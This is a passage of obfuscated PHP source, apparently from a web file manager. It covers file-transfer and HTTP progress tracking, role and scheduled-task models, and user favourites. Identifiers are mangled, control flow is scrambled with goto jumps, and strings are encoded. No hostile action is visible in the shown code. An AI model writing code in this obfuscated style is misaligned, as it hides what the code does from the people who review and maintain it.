!$d›‡ˆùÛš[$f²‰Õƒğì[363]]) { return !1; } $A¡ù§ó…„‹ = array($f²‰Õƒğì[29] => $f²‰Õƒğì[1425], $f²‰Õƒğì[1404] => USER_ID, $f²‰Õƒğì[89] => $e´©ÍÌğ„‘, $f²‰Õƒğì[355] => $F’ƒÚÄéÄÏ); goto A …¡ÌÅ; B°Ûßç¥š: } public static function log($Cœ˜ê“÷ç¼) { write_log($Cœ˜ê“÷ç¼, $_SERVER[õëù©û][1427]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto b…˜¼‚„; D™‡„ƒ«: if (!$C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[1310]]) { $C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[1310]] = LNG($d¯¼Í¯¨[1453]); } goto aßŒ……‘’Ñ; fâãÂôê”: $C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[971]] = $d¯¼Í¯¨[33]; $C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[1451]] = $d¯¼Í¯¨[33]; $C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[1452]] = 0; goto D™‡„ƒ«; E‹¶¦ç´: Hook::bind($d¯¼Í¯¨[1441], array($this, $d¯¼Í¯¨[1442])); Hook::bind($d¯¼Í¯¨[1443], array($this, $d¯¼Í¯¨[1444])); Hook::bind($d¯¼Í¯¨[1445], array($this, $d¯¼Í¯¨[1446])); goto CÉÏ°°Î‚; AàœØë˜®: Hook::bind($d¯¼Í¯¨[1428], array($this, $d¯¼Í¯¨[1429])); Hook::bind($d¯¼Í¯¨[1430], array($this, $d¯¼Í¯¨[1431])); Hook::bind($d¯¼Í¯¨[1432], array($this, $d¯¼Í¯¨[1433])); goto b¯¹èî¹¸Ô; CÉÏ°°Î‚: $C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[1447]] = LNG($d¯¼Í¯¨[1448]); $C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[1449]] = 0; $C¿àÑŠÉ†ƒ[$d¯¼Í¯¨[1450]] = 0; goto fâãÂôê”; Eáª¶‡ˆƒÄ: Hook::bind($d¯¼Í¯¨[538], array($this, $d¯¼Í¯¨[1436])); Hook::bind($d¯¼Í¯¨[504], array($this, $d¯¼Í¯¨[1437])); Hook::bind($d¯¼Í¯¨[501], array($this, $d¯¼Í¯¨[1437])); goto cÆíİ›†“Í; b…˜¼‚„: $d¯¼Í¯¨ =& $_SERVER[õëù©û]; $C¿àÑŠÉ†ƒ =& $this->task; $this->sourceCopyFolder = !1; goto AàœØë˜®; cÆíİ›†“Í: Hook::bind($d¯¼Í¯¨[506], array($this, $d¯¼Í¯¨[1437])); Hook::bind($d¯¼Í¯¨[508], array($this, $d¯¼Í¯¨[1437])); Hook::bind($d¯¼Í¯¨[510], array($this, $d¯¼Í¯¨[1437])); goto eî¡­Ö«á; eî¡­Ö«á: Hook::bind($d¯¼Í¯¨[1438], array($this, $d¯¼Í¯¨[1439])); Hook::bind($d¯¼Í¯¨[527], array($this, $d¯¼Í¯¨[1440])); $this->sourceModelCopyFlag = !1; goto E‹¶¦ç´; b¯¹èî¹¸Ô: Hook::bind($d¯¼Í¯¨[534], array($this, $d¯¼Í¯¨[1434])); Hook::bind($d¯¼Í¯¨[535], array($this, $d¯¼Í¯¨[1435])); Hook::bind($d¯¼Í¯¨[537], array($this, $d¯¼Í¯¨[1436])); goto Eáª¶‡ˆƒÄ; aßŒ……‘’Ñ: } protected function endAfter() { goto E®â¦‘·­; AìÁœ»ƒ—™: Hook::unbind($eµ½¶»Ÿ½®[1441], array($this, $eµ½¶»Ÿ½®[1442])); Hook::unbind($eµ½¶»Ÿ½®[1443], array($this, $eµ½¶»Ÿ½®[1444])); Hook::unbind($eµ½¶»Ÿ½®[1445], array($this, $eµ½¶»Ÿ½®[1446])); goto AÁ¥‹Ü‘å§; E®â¦‘·­: $eµ½¶»Ÿ½® =& $_SERVER[õëù©û]; Hook::unbind($eµ½¶»Ÿ½®[1428], array($this, $eµ½¶»Ÿ½®[1429])); Hook::unbind($eµ½¶»Ÿ½®[1430], array($this, $eµ½¶»Ÿ½®[1431])); goto aŞˆù„Ñ“„; Dã¢ÀÄ³¦: Hook::unbind($eµ½¶»Ÿ½®[510], array($this, $eµ½¶»Ÿ½®[1437])); Hook::unbind($eµ½¶»Ÿ½®[1438], array($this, $eµ½¶»Ÿ½®[1439])); Hook::unbind($eµ½¶»Ÿ½®[527], array($this, $eµ½¶»Ÿ½®[1440])); goto AìÁœ»ƒ—™; AàŸ¸ÇÓ˜: Hook::unbind($eµ½¶»Ÿ½®[537], array($this, $eµ½¶»Ÿ½®[1436])); Hook::unbind($eµ½¶»Ÿ½®[538], array($this, $eµ½¶»Ÿ½®[1436])); Hook::unbind($eµ½¶»Ÿ½®[504], array($this, $eµ½¶»Ÿ½®[1437])); goto Dñ†¤Æ‘é¼; Dñ†¤Æ‘é¼: Hook::unbind($eµ½¶»Ÿ½®[501], array($this, $eµ½¶»Ÿ½®[1437])); Hook::unbind($eµ½¶»Ÿ½®[506], array($this, $eµ½¶»Ÿ½®[1437])); Hook::unbind($eµ½¶»Ÿ½®[508], array($this, $eµ½¶»Ÿ½®[1437])); goto Dã¢ÀÄ³¦; aŞˆù„Ñ“„: Hook::unbind($eµ½¶»Ÿ½®[1432], array($this, $eµ½¶»Ÿ½®[1433])); Hook::unbind($eµ½¶»Ÿ½®[534], array($this, $eµ½¶»Ÿ½®[1434])); Hook::unbind($eµ½¶»Ÿ½®[535], array($this, $eµ½¶»Ÿ½®[1435])); goto AàŸ¸ÇÓ˜; AÁ¥‹Ü‘å§: } public function copyMoveStart($B†³õÓºŸ±, $aæ¬Ğ¨Üé, $f»¡Ú¦‡Äê, $D¶‘¯·Íã) { } public function updateAfter() { goto BËÍªáçÙ; BËÍªáçÙ: $BìŞ‹µŠ–Œ =& $_SERVER[õëù©û]; $AîÖ‰ôÌ¬» =& $this->task; if (!$AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[693]]) { return; } goto DÉÔšëí÷; DÉÔšëí÷: if ($this->sourceModelCopyFlag) { return; } $fÜ¾êè·Éâ = 0; if ($AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1451]] == $BìŞ‹µŠ–Œ[1031]) { $fÜ¾êè·Éâ = $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1450]] * 0.5; } else { if ($AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1451]] == $BìŞ‹µŠ–Œ[102]) { $fÜ¾êè·Éâ = $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1450]] * 0.5 + $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1449]] * 0.5; } } goto AŠ…­ÑÎÀÅ; AŠ…­ÑÎÀÅ: $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1405]] = ($AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1454]] + $fÜ¾êè·Éâ) / $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[693]]; if ($AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1405]] > 0) { $Bî¨ìğ™·³ = timeFloat() - $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1407]] - $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1410]]; $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1411]] = $Bî¨ìğ™·³ * (1 - $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1405]]) / $AîÖ‰ôÌ¬»[$BìŞ‹µŠ–Œ[1405]]; } goto Bâƒ…’—¯; Bâƒ…’—¯: } public function addPath($F¯¸ÕÎÀ©ğ) { goto a¯™ˆÉÅ¨Ø; cÅÃ¡Ö¨ÙÙ: $BÓ‹ÓÌ¥ç™ = IO::infoWithChildren($F¯¸ÕÎÀ©ğ); $BÒŠŠÃ±ìî = $eáÙóßë°×[$BêÉõ¬†¦ï[1455]] ? $eáÙóßë°×[$BêÉõ¬†¦ï[1455]][$BêÉõ¬†¦ï[1456]] : 0; $eáÙóßë°×[$BêÉõ¬†¦ï[1455]] = array($BêÉõ¬†¦ï[1456] => $BÒŠŠÃ±ìî + 1, $BêÉõ¬†¦ï[382] => $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[28]], $BêÉõ¬†¦ï[75] => $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[75]], $BêÉõ¬†¦ï[461] => $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[461]] ? $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[461]] : $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[75]]); goto dšŞ ¶™; dšŞ ¶™: if ($BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[29]] == $BêÉõ¬†¦ï[163]) { $eáÙóßë°×[$BêÉõ¬†¦ï[969]] += 1; } else { $eáÙóßë°×[$BêÉõ¬†¦ï[969]] += $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[80]][$BêÉõ¬†¦ï[78]]; if ($BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[365]]) { $eáÙóßë°×[$BêÉõ¬†¦ï[969]] += $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[80]][$BêÉõ¬†¦ï[79]] + 1; } } $eáÙóßë°×[$BêÉõ¬†¦ï[693]] += $BÓ‹ÓÌ¥ç™[$BêÉõ¬†¦ï[77]]; $this->update(); goto C”ëâ‘¡±ù; a¯™ˆÉÅ¨Ø: $BêÉõ¬†¦ï =& $_SERVER[õëù©û]; if (!$F¯¸ÕÎÀ©ğ) { return; } $eáÙóßë°× =& $this->task; goto cÅÃ¡Ö¨ÙÙ; C”ëâ‘¡±ù: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($eôñ‡å‡Ãğ) { $f»«©÷§ªÚ =& $_SERVER[õëù©û]; $fôéÜˆò“Ú =& $this->task; $fôéÜˆò“Ú[$f»«©÷§ªÚ[1447]] = $eôñ‡å‡Ãğ[$f»«©÷§ªÚ[28]]; $fôéÜˆò“Ú[$f»«©÷§ªÚ[971]] = $eôñ‡å‡Ãğ[$f»«©÷§ªÚ[28]]; $this->update(); } public function copyFileStart($cù¶™¤¤×ê, $DâœÀ¯Ï›Ù, $bÔÑ¹ÔÔÒİ, $fÌ„¶ˆ¬Î£, $FÀÙ¸‰ØÑ†, $Fƒ¤Ñ¹Œ) { goto fÈˆÆÓ†‚í; FØŒëá¯æ: $Dœ·ŠÛ Ò[$EİÔËÃÌ®í[971]] = $EİÔËÃÌ®í[33]; $Dœ·ŠÛ Ò[$EİÔËÃÌ®í[1451]] = $EİÔËÃÌ®í[33]; $Dœ·ŠÛ Ò[$EİÔËÃÌ®í[1452]] = 0; goto f“¡…„•£; fÈˆÆÓ†‚í: $EİÔËÃÌ®í =& $_SERVER[õëù©û]; $F„ê˜ã¨… = $FÀÙ¸‰ØÑ†; if ($F„ê˜ã¨… == $GLOBALS[$EİÔËÃÌ®í[1457]]) { $F„ê˜ã¨… = $GLOBALS[$EİÔËÃÌ®í[1458]]; } goto FäĞ´ÊÖõ; f“¡…„•£: $this->update(); goto e£Ì¢ö×ö™; FäĞ´ÊÖõ: $GLOBALS[$EİÔËÃÌ®í[1458]] = $FÀÙ¸‰ØÑ†; $GLOBALS[$EİÔËÃÌ®í[1457]] = $Fƒ¤Ñ¹Œ; $Dœ·ŠÛ Ò =& $this->task; goto CªÜƒ•£³£; CªÜƒ•£³£: $Dœ·ŠÛ Ò[$EİÔËÃÌ®í[1447]] = $F„ê˜ã¨…; $Dœ·ŠÛ Ò[$EİÔËÃÌ®í[1449]] = (int) $cù¶™¤¤×ê->size($DâœÀ¯Ï›Ù); $Dœ·ŠÛ Ò[$EİÔËÃÌ®í[1450]] = 0; goto FØŒëá¯æ; e£Ì¢ö×ö™: } public function copyFileEnd($CÎùˆ’µÖ, $B¢Ì†×©äÌ, $AŒ±·Ğõ¬Å, $fÀˆ‹Òš“÷, $c¤…É‰¼¨, $FÙÖÛÃ°ÄÌ) { $bîŸÉ£·—“ =& $_SERVER[õëù©û]; $b˜‹İÇ–« =& $this->task; $b˜‹İÇ–«[$bîŸÉ£·—“[1450]] = $b˜‹İÇ–«[$bîŸÉ£·—“[1449]]; $b˜‹İÇ–«[$bîŸÉ£·—“[1451]] = $bîŸÉ£·—“[33]; if ($c¤…É‰¼¨ == $b˜‹İÇ–«[$bîŸÉ£·—“[1447]]) { $b˜‹İÇ–«[$bîŸÉ£·—“[1454]] += $b˜‹İÇ–«[$bîŸÉ£·—“[1449]]; $this->update(1); } else { $this->update(); $b˜‹İÇ–«[$bîŸÉ£·—“[1450]] = 0; } self::log($bîŸÉ£·—“[1459] . $B¢Ì†×©äÌ . $bîŸÉ£·—“[66] . $fÀˆ‹Òš“÷ . $bîŸÉ£·—“[213] . $c¤…É‰¼¨ . $bîŸÉ£·—“[1460] . $b˜‹İÇ–«[$bîŸÉ£·—“[1447]]); } public function updateFileEnd($BÛ ¡¯Ëõ¨, $bÈ­öÆ‚ÆÙ) { $fŒƒŸ”‡˜ =& $_SERVER[õëù©û]; $B‡Ï™ÇµÂ© =& $this->task; $B‡Ï™ÇµÂ©[$fŒƒŸ”‡˜[1447]] = $BÛ ¡¯Ëõ¨; $B‡Ï™ÇµÂ©[$fŒƒŸ”‡˜[1449]] = $bÈ­öÆ‚ÆÙ; $B‡Ï™ÇµÂ©[$fŒƒŸ”‡˜[1454]] += $bÈ­öÆ‚ÆÙ; $this->update(1); } public function sourceModelCopy($DêÀ×¸ö«) { goto e­Æ¤ôµùë; e­Æ¤ôµùë: $eƒÁèŞµ =& $_SERVER[õëù©û]; $dÄÀœÆ´”Ğ = $DêÀ×¸ö«[0]; $FˆšÂÂÛ· = $DêÀ×¸ö«[1]; goto cÏ‡ÜŞƒ‘; cÏ‡ÜŞƒ‘: $f­Ë‹ª±¿ø =& $this->task; $this->sourceModelCopyFlag = !0; $bˆ¿è¿ì´˜ = 0; goto c×™Ÿ‹Ş„ø; c×™Ÿ‹Ş„ø: switch ($dÄÀœÆ´”Ğ) { case $eƒÁèŞµ[502]: $bˆ¿è¿ì´˜ = 1; break; case $eƒÁèŞµ[505]: $f­Ë‹ª±¿ø[$eƒÁèŞµ[1447]] = $FˆšÂÂÛ·[$eƒÁèŞµ[28]]; break; case $eƒÁèŞµ[507]: $bˆ¿è¿ì´˜ = intval($DêÀ×¸ö«[$eƒÁèŞµ[359]] * 0.4); break; case $eƒÁèŞµ[509]: $bˆ¿è¿ì´˜ = intval($DêÀ×¸ö«[$eƒÁèŞµ[359]] * 0.2); break; case $eƒÁèŞµ[511]: $bˆ¿è¿ì´˜ = intval($DêÀ×¸ö«[$eƒÁèŞµ[359]] * 0.4); break; } $this->update($bˆ¿è¿ì´˜); $this->sourceModelCopyFlag = !1; goto c¿ˆÀÇÏÂï; c¿ˆÀÇÏÂï: } public function sourceRemove($B¿ğÌˆ‘ÕÕ, $D®²¿‹Èõã) { $báô¯“²Ÿ =& $_SERVER[õëù©û]; $this->sourceModelCopyFlag = !0; $f¹İğé¢ = 1; if (isset($B¿ğÌˆ‘ÕÕ[$báô¯“²Ÿ[80]])) { $f¹İğé¢ = $B¿ğÌˆ‘ÕÕ[$báô¯“²Ÿ[80]][$báô¯“²Ÿ[78]] + $B¿ğÌˆ‘ÕÕ[$báô¯“²Ÿ[80]][$báô¯“²Ÿ[79]] + 1; } $this->update($f¹İğé¢); $this->sourceModelCopyFlag = !1; } public function sourceMove($Dô¸ƒÏ–¾Ó) { $this->sourceRemove($Dô¸ƒÏ–¾Ó, !1); } public function curlProgress($Aá†íÍøÊˆ, $aÅ¼–†¡²†, $c¡ÁÌÅÁÔç, $bº®Ğˆ²˜, $aëÖ¶…Ãò) { $D›…ÆÍÓš =& $_SERVER[õëù©û]; $Fñ‹³Ü¹„Ï =& $this->task; if ($aëÖ¶…Ãò > 0) { $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[971]] = $D›…ÆÍÓš[1461]; $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1451]] = $D›…ÆÍÓš[102]; if ($Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1449]] == $bº®Ğˆ²˜ || $bº®Ğˆ²˜ > 1024 * 1024) { $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1450]] = $aëÖ¶…Ãò; } if ($Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1452]]) { $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1450]] = $aëÖ¶…Ãò + $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1452]]; } } else { if ($c¡ÁÌÅÁÔç > 0) { if ($Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1449]] == $aÅ¼–†¡²†) { $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1450]] = $c¡ÁÌÅÁÔç; $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[971]] = $D›…ÆÍÓš[1462]; $Fñ‹³Ü¹„Ï[$D›…ÆÍÓš[1451]] = $D›…ÆÍÓš[1031]; } } } $this->update(); } public function curlProgressStart($B§Õ„ç±Ë) { } public function curlProgressEnd($aõ¶òõ˜‡) { $CØª³Ÿ§˜º =& $_SERVER[õëù©û]; $Dš«á¯£ñ =& $this->task; $A÷¦ßÊ­òÃ = curl_getinfo($aõ¶òõ˜‡); $FâÀéˆéÄó = $A÷¦ßÊ­òÃ[$CØª³Ÿ§˜º[1463]]; if ($Dš«á¯£ñ[$CØª³Ÿ§˜º[1451]] == $CØª³Ÿ§˜º[102] && $FâÀéˆéÄó) { $Dš«á¯£ñ[$CØª³Ÿ§˜º[1452]] += $FâÀéˆéÄó; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Eµâ É•ô× =& $_SERVER[õëù©û]; Hook::bind($Eµâ É•ô×[1441], array($this, $Eµâ É•ô×[1464])); Hook::bind($Eµâ É•ô×[1443], array($this, $Eµâ É•ô×[1465])); Hook::bind($Eµâ É•ô×[1445], array($this, $Eµâ É•ô×[1466])); } protected function endAfter() { $B‹ƒğğ¦ŞÚ =& $_SERVER[õëù©û]; Hook::unbind($B‹ƒğğ¦ŞÚ[1441], array($this, $B‹ƒğğ¦ŞÚ[1464])); Hook::unbind($B‹ƒğğ¦ŞÚ[1443], array($this, $B‹ƒğğ¦ŞÚ[1465])); Hook::unbind($B‹ƒğğ¦ŞÚ[1445], array($this, $B‹ƒğğ¦ŞÚ[1466])); } public function progressStart($CªÃƒ¹ƒ‹) { $E™®¿ò÷¸› =& $_SERVER[õëù©û]; $dä´Œ‚Ş‘É = curl_getinfo($CªÃƒ¹ƒ‹); self::log($E™®¿ò÷¸›[1467] . $dä´Œ‚Ş‘É[$E™®¿ò÷¸›[291]]); self::valueSet($this->task[$E™®¿ò÷¸›[363]], $this->task); } public function progressEnd($D«»‘–“¯Ã) { $B´íòÖçÜÏ =& $_SERVER[õëù©û]; self::log($B´íòÖçÜÏ[1468] . $this->task[$B´íòÖçÜÏ[363]]); $this->end(); } public function progress($dºøì¡Œ•, $DºÙëØÌõ„, $dš•˜‚®İ, $bÎŒÂ”’Ê‚, $dîª­£—¼‹) { $d½¥Æø‹Î =& $_SERVER[õëù©û]; $d¥¹’î¢‚» =& $this->task; if ($dîª­£—¼‹ > 0) { $d¥¹’î¢‚»[$d½¥Æø‹Î[969]] = $d¥¹’î¢‚»[$d½¥Æø‹Î[969]] == 0 ? $bÎŒÂ”’Ê‚ : $d¥¹’î¢‚»[$d½¥Æø‹Î[969]]; $d¥¹’î¢‚»[$d½¥Æø‹Î[981]] = $dîª­£—¼‹; } else { if ($dš•˜‚®İ > 0) { $d¥¹’î¢‚»[$d½¥Æø‹Î[969]] = $d¥¹’î¢‚»[$d½¥Æø‹Î[969]] == 0 ? $DºÙëØÌõ„ : $d¥¹’î¢‚»[$d½¥Æø‹Î[969]]; $d¥¹’î¢‚»[$d½¥Æø‹Î[981]] = $dš•˜‚®İ; } } $this->update(); self::log("\160\x72\157\x67\162\x65\x73\163\x48\x74\x74\x70\72\144\x6f\x77\156\72{$dš•˜‚®İ}\x2f{$DºÙëØÌõ„}\73\40\165\160\154\157\141\144\72{$dîª­£—¼‹}\57{$bÎŒÂ”’Ê‚}\73"); } } goto dâìÑá¹†“; cÚ½Úœº¢µ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\162\x6f\154\145\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\165\164\x68", "\154\x61\x62\x65\154", "\x64\151\x73\x70\x6c\141\x79", "\x73\x79\x73\164\145\155", "\x64\145\163\143", "\151\147\x6e\157\162\145\x45\x78\164", "\151\x67\156\157\162\145\106\151\x6c\x65\x53\x69\x7a\x65", "\141\144\155\x69\156\x69\x73\164\x72\141\x74\x6f\162", "\163\157\162\x74"); public function listData($A–¦¼½Ú†ó = false, $EµÑÎÍ«¸ = "\x73\x6f\162\164", $Aò½öÄî–· = false) { return parent::listData($A–¦¼½Ú†ó, $EµÑÎÍ«¸, $Aò½öÄî–·); } public function update($Bº‹ËôÈñ, $DŒ©šŠÅæˆ) { goto D…Î›¾ éï; F…õ‹º‡…´: if (!$Aˆñ‡§„¦Ÿ || $e’Îœ¤š«ø && $e’Îœ¤š«ø[$e¡íÔ›íï´[363]] != $Aˆñ‡§„¦Ÿ[$e¡íÔ›íï´[363]]) { return !1; } if ($e’Îœ¤š«ø[$e¡íÔ›íï´[2441]] == 1) { $DŒ©šŠÅæˆ = array($e¡íÔ›íï´[28] => $DŒ©šŠÅæˆ[$e¡íÔ›íï´[28]], $e¡íÔ›íï´[2086] => $DŒ©šŠÅæˆ[$e¡íÔ›íï´[2086]]); } $this->filterAuth($DŒ©šŠÅæˆ[$e¡íÔ›íï´[372]]); goto F£šÓá²Ğ; D…Î›¾ éï: $e¡íÔ›íï´ =& $_SERVER[õëù©û]; $Aˆñ‡§„¦Ÿ = parent::listData($Bº‹ËôÈñ); $e’Îœ¤š«ø = $this->findByName($DŒ©šŠÅæˆ[$e¡íÔ›íï´[28]]); goto F…õ‹º‡…´; F£šÓá²Ğ: return parent::update($Bº‹ËôÈñ, $DŒ©šŠÅæˆ); goto eÏ–á¥Ğï; eÏ–á¥Ğï: } public function remove($cáîŒŠÍ‡§) { $eæåµ Øñ· = parent::listData($cáîŒŠÍ‡§); if (!$eæåµ Øñ· || $eæåµ Øñ·[$_SERVER[õëù©û][1071]]) { return !1; } return parent::remove($cáîŒŠÍ‡§); } public function add($c©ö¸Ò·’–) { goto eäà¯¾›; d¹·ò¾”©™: $DğŒñ½ğİÈ = array($BŠğ®³’„[382] => $F¹ÆğóÙª, $BŠğ®³’„[2074] => $BŠğ®³’„[33], $BŠğ®³’„[2070] => $BŠğ®³’„[2087], $BŠğ®³’„[2442] => 1, $BŠğ®³’„[2073] => 0, $BŠğ®³’„[2443] => 0, $BŠğ®³’„[2072] => $this->getSort()); $c©ö¸Ò·’– = array_merge($DğŒñ½ğİÈ, $c©ö¸Ò·’–); $this->filterAuth($c©ö¸Ò·’–[$BŠğ®³’„[372]]); goto Dµ¥±¼“Ú”; eäà¯¾›: $BŠğ®³’„ =& $_SERVER[õëù©û]; $F¹ÆğóÙª = $c©ö¸Ò·’–[$BŠğ®³’„[28]]; if ($this->findByName($F¹ÆğóÙª)) { return !1; } goto d¹·ò¾”©™; Dµ¥±¼“Ú”: return parent::insert($c©ö¸Ò·’–); goto CèÖ¡ê¿œ; CèÖ¡ê¿œ: } private function getSort() { $cöòùÛĞ»¬ =& $_SERVER[õëù©û]; $FàÀïÆ¦½¯ = parent::listData(); $bƒÒøÛ‚ß† = array_to_keyvalue($FàÀïÆ¦½¯, $cöòùÛĞ»¬[33], $cöòùÛĞ»¬[2089]); return empty($bƒÒøÛ‚ß†) ? 0 : max($bƒÒøÛ‚ß†) + 1; } private function filterAuth(&$a±¦¯¹Ó¸•) { $CÃÉ‡Õ¾˜¯ =& $_SERVER[õëù©û]; $aÁùø¬î„ƒ = array(); $A‚¨æ¡¶©Ù = array_filter(explode($CÃÉ‡Õ¾˜¯[47], $a±¦¯¹Ó¸•)); foreach ($A‚¨æ¡¶©Ù as $a±¦¯¹Ó¸•) { $f»¡™å‘Ñœ = explode($CÃÉ‡Õ¾˜¯[91], $a±¦¯¹Ó¸•); if ($f»¡™å‘Ñœ[0] == $CÃÉ‡Õ¾˜¯[1748] && $f»¡™å‘Ñœ[1] != $CÃÉ‡Õ¾˜¯[1027]) { $dÒÂËäˆÏ = $f»¡™å‘Ñœ[0] . $CÃÉ‡Õ¾˜¯[91] . $f»¡™å‘Ñœ[1] . $CÃÉ‡Õ¾˜¯[2444]; if (!in_array($dÒÂËäˆÏ, $A‚¨æ¡¶©Ù)) { $aÁùø¬î„ƒ[] = $dÒÂËäˆÏ; } } $aÁùø¬î„ƒ[] = $a±¦¯¹Ó¸•; } $a±¦¯¹Ó¸• = implode($CÃÉ‡Õ¾˜¯[47], $aÁùø¬î„ƒ); } public function sort($b²…ª·‹¹, $CÁ²µË Ã…) { return parent::update($b²…ª·‹¹, $CÁ²µË Ã…); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x74\x61\x73\153\114\151\163\x74"; public $field = array("\156\x61\155\145", "\x74\x79\160\x65", "\x65\x76\145\x6e\x74", "\164\151\155\x65", "\x64\x65\163\143", "\163\x79\163\164\145\155", "\x65\156\141\x62\x6c\x65", "\x6c\141\x73\x74\122\165\156", "\163\157\162\x74"); public function listData($cùˆ½õ›Ø• = false, $DÑ”‹íˆØ‘ = "\163\157\x72\x74", $dÌŸ¶ÔáÊ = false) { return parent::listData($cùˆ½õ›Ø•, $DÑ”‹íˆØ‘, $dÌŸ¶ÔáÊ); } public function add($F†®ŒâºÍƒ) { $C†«Ö¶„ˆ =& $_SERVER[õëù©û]; $B©…‡óËù× = $this->findByName($F†®ŒâºÍƒ[$C†«Ö¶„ˆ[28]]); if ($B©…‡óËù×) { return !1; } $F†®ŒâºÍƒ[$C†«Ö¶„ˆ[1369]] = 0; $F†®ŒâºÍƒ[$C†«Ö¶„ˆ[2089]] = $this->getSort(); return parent::insert($F†®ŒâºÍƒ); } private function getSort() { $cÊ—äŸÏ·Ò =& $_SERVER[õëù©û]; $C¯ÙêÀ¿§ = parent::listData(); $Cñâ›ºÄè = array_to_keyvalue($C¯ÙêÀ¿§, $cÊ—äŸÏ·Ò[33], $cÊ—äŸÏ·Ò[2089]); return empty($Cñâ›ºÄè) ? 0 : max($Cñâ›ºÄè) + 1; } public function update($F­¸Û©˜ˆ, $D£Ó´„À¶Ñ) { $E§À˜£ë‰è =& $_SERVER[õëù©û]; $bôÁ‚ß†ğõ = $this->listData($F­¸Û©˜ˆ); $dà³…Ã‘œ = $this->findByName($D£Ó´„À¶Ñ[$E§À˜£ë‰è[28]]); if (!$bôÁ‚ß†ğõ || $dà³…Ã‘œ && $dà³…Ã‘œ[$E§À˜£ë‰è[363]] != $bôÁ‚ß†ğõ[$E§À˜£ë‰è[363]]) { return !1; } return parent::update($F­¸Û©˜ˆ, $D£Ó´„À¶Ñ); } public function remove($Aö¿÷Ÿ¡–, $f‹‹á¾Œï = false) { $dÍî´ÖÁ³ö =& $_SERVER[õëù©û]; $E¿ê  ÖĞ = $this->listData($Aö¿÷Ÿ¡–); if (!$E¿ê  ÖĞ) { return; } if (!$f‹‹á¾Œï && $E¿ê  ÖĞ[$dÍî´ÖÁ³ö[1071]] == $dÍî´ÖÁ³ö[83]) { return !1; } return parent::remove($Aö¿÷Ÿ¡–); } public function enable($DÈøò’Ï, $C—âñ¡ÇæÓ) { return $this->update($DÈøò’Ï, array($_SERVER[õëù©û][2435] => $C—âñ¡ÇæÓ)); } public function run($F¤†£À³ö‘) { return $this->update($F¤†£À³ö‘, array($_SERVER[õëù©û][2445] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($fÁ©½Ç³ª) { $FÑ™Ø†óËÛ =& $_SERVER[õëù©û]; return array($FÑ™Ø†óËÛ[2446] => array(USER_ID, $FÑ™Ø†óËÛ[2447])); } protected function listData() { $dÀ’‘Ó”È© =& $_SERVER[õëù©û]; $cšù¶‰äÔ˜ = array($dÀ’‘Ó”È©[1395] => USER_ID, $dÀ’‘Ó”È©[431] => 0); $bËˆ„•«” = $dÀ’‘Ó”È©[2448]; $dãï·¾©¶Š = $this->field($bËˆ„•«”)->where($cšù¶‰äÔ˜)->order($dÀ’‘Ó”È©[2449])->select(); return $dãï·¾©¶Š ? $dãï·¾©¶Š : array(); } protected function resetCache() { } protected function listView() { goto CÂ‡îïèïê; f¸ÕÑ¸£: $C²Îé”ì = array_to_keyvalue($C²Îé”ì, $E„‚¾¬ÀğÊ[365]); foreach ($B÷Ïäİ“ç¯ as $f¿µ¨›Ş’ñ => $fÀÖÈŞÉ) { $A ÓŞ…åù = $C²Îé”ì[$fÀÖÈŞÉ[$E„‚¾¬ÀğÊ[75]]]; $A ÓŞ…åù = $A ÓŞ…åù ? $A ÓŞ…åù : array(); $B÷Ïäİ“ç¯[$f¿µ¨›Ş’ñ] = array_merge($A ÓŞ…åù, $fÀÖÈŞÉ); } return $B÷Ïäİ“ç¯; goto Aôİàèƒö’; F‹˜ÔêğŸ: $dÎ…Ë…‰è = array($E„‚¾¬ÀğÊ[379] => array($E„‚¾¬ÀğÊ[380], $aößÒ¹‰Ğ)); $C²Îé”ì = 